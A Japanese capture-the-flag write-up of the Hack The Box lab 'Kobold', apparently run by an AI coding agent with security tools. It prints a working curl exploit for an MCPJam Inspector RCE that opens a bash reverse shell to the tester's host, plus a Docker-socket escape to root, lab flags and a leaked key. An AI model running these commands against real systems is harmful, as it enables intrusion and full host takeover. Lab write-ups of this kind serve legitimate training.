# HTB Kobold — ペネトレーションテストレポート

**対象**: 10.129.245.50 (kobold.htb)
**実施日**: 2026-04-05
**実施者**: noir (Kali Linux / Claude Code + Phantom MCP)
**結果**: User Flag + Root Flag 取得完了

---

## 1. エグゼクティブサマリー

HTB (Hack The Box) マシン「Kobold」に対するペネトレーションテストを実施した。
Phantomの27セキュリティツールをMCPブリッジ経由でClaude Code CLIから呼び出す構成で攻略を行った。

### 攻撃チェーン概要

```
Nmap (4ポート検出)
  ↓
サブドメイン列挙 → mcp.kobold.htb (MCPJam Inspector 1.4.2)
  ↓                 bin.kobold.htb (PrivateBin 2.0.2)
CVE-2026-23744 RCE → /api/mcp/connect にリバースシェル送信
  ↓
ユーザー ben としてシェル取得 → user.txt
  ↓
sg docker → Docker ソケットアクセス
  ↓
docker run -u 0 -v /:/mnt → ホストルートFS マウント → root.txt
```

### 取得フラグ

| フラグ | 値 |
|---|---|
| **User** | `103eb804d8a7c46467c823ec0ee1131a` |
| **Root** | `b2fb5ee184aac192fc9b0551d3327a7f` |

### 発見脆弱性サマリ

| CVE | 脆弱性 | CVSS | 悪用 |
|---|---|---|---|
| CVE-2026-23744 | MCPJam Inspector RCE | 9.8 | **悪用済** |
| CVE-2026-23944 | Arcane 認証バイパス | 9.8 | 未悪用（リモート環境未設定） |
| CVE-2026-23520 | Arcane コマンドインジェクション | 9.1 | 未悪用（認証必要） |
| — | Docker Socket 権限昇格 | High | **悪用済** |
| — | ENCRYPTION_KEY 漏洩 | Medium | 発見のみ |

---

## 2. ターゲット情報

| 項目 | 値 |
|---|---|
| IPアドレス | 10.129.245.50 |
| ホスト名 | kobold.htb |
| サブドメイン | bin.kobold.htb, mcp.kobold.htb |
| OS | Ubuntu Linux |
| VPN接続 | tun0 (10.10.15.43) |
| スコープ | scopes/current_scope.md に定義 |

---

## 3. 偵察フェーズ

### 3.1 Nmap 全ポートスキャン

```bash
nmap -sC -sV -T4 -p- --min-rate=1000 10.129.245.50
```

| ポート | サービス | バージョン | 備考 |
|---|---|---|---|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 | |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) | 301 → https://kobold.htb/ |
| 443/tcp | HTTPS | nginx 1.24.0 (Ubuntu) | TLS証明書: CN=kobold.htb, **SAN=\*.kobold.htb** |
| 3552/tcp | HTTP | Golang net/http server | Arcane Docker Management v1.13.0 |

**重要発見**: TLS証明書のワイルドカードSAN (`*.kobold.htb`) がサブドメインの存在を示唆。

### 3.2 サブドメイン列挙

**最初の試行（失敗）**:
```bash
ffuf -u "https://kobold.htb/" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.kobold.htb" -t 50 -fs 3812 -mc all
```
→ 結果: 0件。`mcp` が5000件のワードリストに含まれていなかった。

**正しいアプローチ**: 20000件以上のワードリストが必要。
```bash
grep -w "mcp" /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
# → mcp が見つかる
```

**発見されたサブドメイン**:
- `mcp.kobold.htb` → MCPJam Inspector（React SPA）
- `bin.kobold.htb` → PrivateBin 2.0.2

**TLS 1.2問題**: `mcp.kobold.htb` にはTLS 1.3ハンドシェイクがタイムアウト。
```bash
# 失敗
curl -sk https://mcp.kobold.htb/

# 成功
curl -sk --tls-max 1.2 --tlsv1.2 https://mcp.kobold.htb/
```

### 3.3 Webサービス調査

#### HTTPS (ポート443) — Kobold Operations Suite

静的ランディングページ（3812バイト）。「Coming Soon」表示。
フッターに `admin@kobold.htb` のメールアドレス漏洩。

#### ポート3552 — Arcane Docker Management v1.13.0

SvelteKit フロントエンド + Go バックエンドの Docker管理プラットフォーム。

**OpenAPI仕様** (`/api/openapi.json`): 263KB、約140エンドポイント。

```json
{
  "info": {
    "title": "Arcane API",
    "version": "1.13.0"
  }
}
```

**公開エンドポイント**:

| ステータス | パス | 内容 |
|---|---|---|
| 200 | /api/health | `{"status":"UP"}` |
| 200 | /api/templates | 空リスト |
| 200 | /api/version | v1.13.0, go1.25.5 |
| 200 | /api/openapi.json | 完全なAPI仕様 |
| 200 | /api/docs | ドキュメント |
| 401 | /api/users | 認証必要 |
| 500 | /api/oidc/config | OIDC設定エラー |

**認証方式**: JWT Bearer + X-API-Key

**デフォルトクレデンシャル**: `arcane:arcane-admin` → 変更済み（ログイン失敗）

#### mcp.kobold.htb — MCPJam Inspector

MCPJam Inspector v1.4.2。React SPA。
`/api/mcp/connect` エンドポイントが存在し、任意のコマンド実行が可能。

#### bin.kobold.htb — PrivateBin 2.0.2

PrivateBin ペーストビンサービス。jQuery 3.7.1、Bootstrap 5.3.8。

---

## 4. 脆弱性分析

### 4.1 CVE-2026-23744 — MCPJam Inspector RCE（CVSS 9.8）[悪用済]

| 項目 | 値 |
|---|---|
| 対象 | MCPJam Inspector ≤ 1.4.2 |
| エンドポイント | POST /api/mcp/connect |
| 認証 | **不要** |
| 影響 | リモートコード実行（ユーザー ben） |

**脆弱性詳細**: MCPJam Inspector はデフォルトで `0.0.0.0` でリッスンし、
`/api/mcp/connect` エンドポイントが `serverConfig.command` で指定された
任意のコマンドをサーバー上で実行する。認証は不要。

**攻撃フロー**:
1. 攻撃者が `/api/mcp/connect` にPOSTリクエスト送信
2. `serverConfig.command` にシェルコマンドを指定
3. サーバーが指定コマンドを直接実行
4. リバースシェルにより対話的アクセス取得

### 4.2 CVE-2026-23944 — Arcane 認証バイパス（CVSS 9.8）[未悪用]

| 項目 | 値 |
|---|---|
| 対象 | Arcane < v1.13.2 |
| 脆弱性 | リモート環境プロキシが認証前に実行 |
| 理由 | このマシンにリモート環境が未設定 |

環境プロキシミドルウェアが認証ミドルウェアの前に登録されており、
非ローカル環境IDへのリクエストが認証なしでプロキシされる。
ただし、このマシンではリモート環境が設定されていなかったため悪用不可。

### 4.3 CVE-2026-23520 — Arcane コマンドインジェクション（CVSS 9.1）[未悪用]

| 項目 | 値 |
|---|---|
| 対象 | Arcane < v1.13.0 |
| 脆弱性 | ライフサイクルラベルのコマンドインジェクション |
| 理由 | 認証済みユーザーが必要（ログイン突破できず） |

### 4.4 Docker Socket 権限昇格 [悪用済]

| 項目 | 値 |
|---|---|
| 脆弱性 | operator グループから sg docker でDockerアクセス可能 |
| 影響 | ホストルートファイルシステムへのフルアクセス |
| 前提 | ユーザー ben が operator グループに所属 |

### 4.5 ENCRYPTION_KEY 漏洩 [発見のみ]

```ini
# /etc/systemd/system/arcane.service
Environment=ENCRYPTION_KEY="Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E="
```

Arcaneの暗号化キーがsystemdサービスファイルに平文で記載。

---

## 5. エクスプロイテーションフェーズ

### 5.1 Initial Access — CVE-2026-23744

**準備**: tmux でリバースシェルリスナーを起動

```bash
tmux new-session -d -s htb
tmux send-keys -t htb "nc -lvnp 4444" Enter
```

**エクスプロイト実行**:

```bash
curl -sk --tls-max 1.2 --tlsv1.2 -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"shell1","serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.15.43/4444 0>&1"],"env":{}}}'
```

**結果**: ユーザー `ben` としてリバースシェル取得。

```
connect to [10.10.15.43] from (UNKNOWN) [10.129.245.50] 48964
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

### 5.2 User Flag

```bash
cat /home/ben/user.txt
# 103eb804d8a7c46467c823ec0ee1131a
```

### 5.3 ポストエクスプロイテーション列挙

```bash
# ユーザー情報
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

# Docker グループ
cat /etc/group | grep docker
# docker:x:111:alice  ← ben は docker グループに入っていない

# sudo 権限
sudo -l
# パスワード必要（不明）

# SUID バイナリ
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/newgrp, /usr/bin/su, /usr/bin/sudo 等（標準セット）

# Docker ソケット
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 ... /var/run/docker.sock
# → docker グループのみアクセス可能

# Arcane サービス設定
cat /etc/systemd/system/arcane.service
# → ENCRYPTION_KEY が漏洩

# PrivateBin データ（operator グループでアクセス可能）
ls -la /privatebin-data/
# drwxrwx--- 5 root operator 4096 ... .
```

### 5.4 権限昇格 — Docker Socket Escape

**鍵となる発見**: `sg docker -c` コマンドで、ben が docker グループに
所属していなくてもDockerコマンドを実行可能。

```bash
# コンテナ一覧
sg docker -c 'docker ps'
# CONTAINER ID   IMAGE                               NAMES
# 4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   bin

# 最初の試行（失敗 — 権限不足）
sg docker -c 'docker run --rm --entrypoint cat -v /:/mnt \
  privatebin/nginx-fpm-alpine:2.0.2 /mnt/root/root.txt'
# cat: can't open '/mnt/root/root.txt': Permission denied

# 修正 — -u 0 でroot ユーザーを指定
sg docker -c 'docker run --rm -u 0 --entrypoint cat -v /:/mnt \
  privatebin/nginx-fpm-alpine:2.0.2 /mnt/root/root.txt'
```

### 5.5 Root Flag

```
b2fb5ee184aac192fc9b0551d3327a7f
```

---

## 6. 攻撃チェーンフロー図

```
┌─────────────────────────────────────────────────────────────────┐
│                      偵察フェーズ                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Nmap -p- スキャン                                               │
│  ├── 22/tcp  SSH (OpenSSH 9.6p1)                                │
│  ├── 80/tcp  HTTP → 301 → https://kobold.htb/                  │
│  ├── 443/tcp HTTPS (nginx, TLS cert: *.kobold.htb)              │
│  └── 3552/tcp Go HTTP (Arcane Docker Management v1.13.0)        │
│                     │                                           │
│                     ▼                                           │
│  サブドメイン列挙 (ffuf vhost, 20K wordlist)                     │
│  ├── mcp.kobold.htb → MCPJam Inspector 1.4.2                   │
│  └── bin.kobold.htb → PrivateBin 2.0.2                         │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                    エクスプロイトフェーズ                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CVE-2026-23744 (MCPJam RCE, CVSS 9.8)                         │
│  POST /api/mcp/connect                                          │
│  {"serverConfig":{"command":"bash","args":["-c","rev shell"]}}  │
│                     │                                           │
│                     ▼                                           │
│  リバースシェル取得 → ユーザー ben                                │
│  /home/ben/user.txt → 103eb804d8a7c46467c823ec0ee1131a          │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                    権限昇格フェーズ                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ben (operator group) → sg docker -c で Docker アクセス          │
│                     │                                           │
│                     ▼                                           │
│  docker run -u 0 -v /:/mnt → ホスト root FS マウント             │
│  /mnt/root/root.txt → b2fb5ee184aac192fc9b0551d3327a7f          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 7. 使用ツール・技術

### Phantom MCPツール（MCP経由で使用）

| ツール | 用途 |
|---|---|
| `mcp__phantom__check_scope` | スコープ確認（10.129.245.50） |
| `mcp__phantom__run_whatweb` | Webフィンガープリント（443, 3552） |
| `mcp__phantom__run_graphql_enum` | GraphQL エンドポイント調査（3552） |
| `mcp__phantom__run_nuclei` | CVE/設定ミススキャン（3552） |
| `mcp__phantom__run_ffuf` | ディレクトリ列挙（3552 /api/FUZZ） |

### 直接実行ツール（Bash経由）

| ツール | 用途 |
|---|---|
| nmap | 全ポートスキャン (-p- -sC -sV) |
| ffuf | サブドメイン列挙 (vhost fuzzing) |
| curl | HTTP/HTTPS リクエスト、API調査、エクスプロイト送信 |
| nc (netcat) | リバースシェルリスナー |
| tmux | リバースシェルセッション管理 |
| searchsploit | エクスプロイトDB検索 |

---

## 8. タイムライン

| 時刻 (EDT) | アクション |
|---|---|
| 08:44 | スコープ確認、/etc/hosts 設定 |
| 08:47 | Nmap 全ポートスキャン開始 |
| 09:02 | Nmap 完了（4ポート検出） |
| 09:03 | HTTPS サイト調査（静的ページ） |
| 09:05 | ポート3552 調査 → Arcane Docker Management 発見 |
| 09:07 | OpenAPI仕様取得（263KB, ~140エンドポイント） |
| 09:10 | API エンドポイント列挙、認証方式確認 |
| 09:12 | デフォルトクレデンシャル試行（失敗） |
| 09:15 | CVE-2026-23944, CVE-2026-23520 発見 |
| 09:18 | 認証バイパス試行（リモート環境未設定で失敗） |
| 09:25 | サブドメイン列挙（5K リスト → 失敗） |
| 09:28 | Writeup参照 → 20K リストの必要性を認識 |
| 09:35 | mcp.kobold.htb, bin.kobold.htb 発見 |
| 09:40 | TLS 1.2 問題解決 |
| 09:42 | MCPJam Inspector 確認 |
| 09:45 | CVE-2026-23744 の /api/mcp/connect エンドポイント確認 |
| 09:48 | tmux リスナー起動 |
| 09:50 | リバースシェル取得（ユーザー ben） |
| 09:51 | **User Flag 取得** |
| 09:52 | ポストエクスプロイテーション列挙 |
| 09:54 | sg docker -c でDockerアクセス発見 |
| 09:55 | Docker escape 試行（-u 0 なし → 権限不足） |
| 09:56 | Docker escape 成功（-u 0 --entrypoint cat） |
| 09:56 | **Root Flag 取得** |

---

## 9. 推奨される修正措置

### 緊急（Critical）

| 脆弱性 | 修正 |
|---|---|
| CVE-2026-23744 | MCPJam Inspector をv1.4.3以上に更新、または 127.0.0.1 にバインド |
| Docker Socket | docker グループへの不適切なアクセスを制限、sg コマンドの監査 |

### 重要（High）

| 脆弱性 | 修正 |
|---|---|
| CVE-2026-23944 | Arcane をv1.13.2以上に更新 |
| CVE-2026-23520 | Arcane をv1.13.0以上に更新（ライフサイクルラベル削除） |
| ENCRYPTION_KEY 漏洩 | systemd サービスファイルではなく /etc/arcane/secrets に移動 |

### 中（Medium）

| 脆弱性 | 修正 |
|---|---|
| TLS設定 | TLS 1.3のみを許可、TLS 1.2を無効化 |
| 情報漏洩 | admin@kobold.htb をランディングページから削除 |
| OpenAPI公開 | /api/openapi.json を認証必須に変更 |

---

## 10. 失敗と成功から得た知見

### 10.1 サブドメイン列挙の失敗と教訓

**失敗**: `subdomains-top1million-5000.txt` を使用し、`mcp` が含まれず発見できなかった。

**原因分析**:
- ワイルドカードSAN (`*.kobold.htb`) を確認しておりサブドメイン存在は推測できた
- しかし5000件のリストでは `mcp` のような技術用語が含まれていなかった
- フィルタ設定 (`-fs 3812`) も一部影響した可能性

**教訓**: サブドメイン列挙には最低 `subdomains-top1million-20000.txt` を使用する。
時間がかかっても網羅性を優先。この知見は `feedback_subdomain_wordlist.md` に永続化済み。

### 10.2 TLS 1.2 の発見

**問題**: `curl -sk https://mcp.kobold.htb/` がTLS 1.3ハンドシェイクでタイムアウト。

**解決**: `--tls-max 1.2 --tlsv1.2` フラグの追加。

**教訓**: TLS接続失敗時は、TLSバージョンの互換性を疑う。

### 10.3 tmux 活用

**課題**: Claude Code のBashツールでリバースシェルリスナーを管理する困難さ。

**解決**: tmux で別セッション/ペインにリスナーを配置し、
`send-keys` / `capture-pane` でコマンド送信・出力取得。

```bash
# リスナー起動
tmux new-session -d -s htb
tmux send-keys -t htb "nc -lvnp 4444" Enter

# コマンド実行
tmux send-keys -t htb "whoami" Enter

# 出力取得
tmux capture-pane -t htb -p | tail -10
```

この知見は `feedback_tmux_revshell.md` に永続化済み。

### 10.4 Phantom MCPツールの活用

**成功**: `check_scope`, `run_whatweb`, `run_graphql_enum`, `run_nuclei`, `run_ffuf` を
MCP経由で呼出し、Phantomのスコープ強制・出力パースの恩恵を受けた。

**課題**: MCPツールはセッション開始時にロードされるため、途中追加は再起動が必要だった。
また、APIパス列挙等のカスタム調査はBash/curlの方が柔軟だった。

**教訓**: PhantomのMCPツールは標準的なスキャン（nmap, nuclei等）に適し、
カスタムAPI調査やエクスプロイト送信はBash直接実行が効率的。

### 10.5 認証バイパスの判断

**経緯**: Arcane v1.13.0 の CVE-2026-23944（認証バイパス）を発見し、
環境IDのブルートフォースを試みたが、リモート環境が未設定で悪用不可だった。

**ピボット**: 代替攻撃ベクトル（MCPJam Inspector CVE-2026-23744）への切替判断。

**教訓**: 1つの脆弱性にこだわらず、複数の攻撃ベクトルを並行調査する。

### 10.6 Docker権限昇格の詳細

**問題1**: ben は docker グループに入っていない（`groups=ben,operator`）。
→ **解決**: `sg docker -c 'command'` で docker グループ権限を取得。
  `sg` コマンドは SUID バイナリで、指定グループの権限でコマンドを実行する。

**問題2**: コンテナのデフォルトエントリポイントが `/etc/init.d/rc.local` で cat が実行されない。
→ **解決**: `--entrypoint cat` でエントリポイントを上書き。

**問題3**: コンテナがデフォルトユーザー（非root）で実行され、`/mnt/root/` にアクセス不可。
→ **解決**: `-u 0` でコンテナ内のユーザーをroot (UID 0) に指定。

---

## 11. Phantom メモリシステムによる知見の永続化

今回の攻略で得た知見は、Claude Code のメモリシステム
(`~/.claude/projects/-home-noir-phantom-ethical-redteam/memory/`) に永続化した。
これにより、将来のセッションで自動的に読み込まれ、同じ失敗を繰り返さない。

### 保存された知見ファイル

| ファイル | 種別 | 内容 |
|---|---|---|
| `feedback_subdomain_wordlist.md` | feedback | 20K+ワードリスト使用の教訓 |
| `feedback_tmux_revshell.md` | feedback | tmuxによるリバースシェル管理パターン |
| `project_htb_kobold_mission.md` | project | ミッション完了記録・攻撃チェーン |
| `reference_phantom_mcp_tools.md` | reference | 27ツール一覧とBashフォールバック |
| `user_noir.md` | user | ユーザープロファイル |

### メモリの仕組み

```
MEMORY.md (インデックス)
  ├── feedback_*.md → 「次回こうする」系の行動指針
  ├── project_*.md  → ミッション状況・進行記録
  ├── reference_*.md → 参照情報（ツール一覧、外部リソース）
  └── user_*.md     → ユーザーの好み・環境情報
```

新しいセッションで自動読込 → 過去の教訓を踏まえた判断が可能になる。

---

## 12. 付録: 使用環境

| 項目 | 値 |
|---|---|
| 攻撃マシン | Kali Linux 6.18.12+kali-amd64 |
| LLM | Claude Opus 4.6 (Max 20x プラン) |
| ツール基盤 | Phantom v3.2.5 (27 MCP ツール) |
| MCP ブリッジ | mcp_bridge.py (FastMCP 3.2.0) |
| Python | 3.13.12 (.venv) |
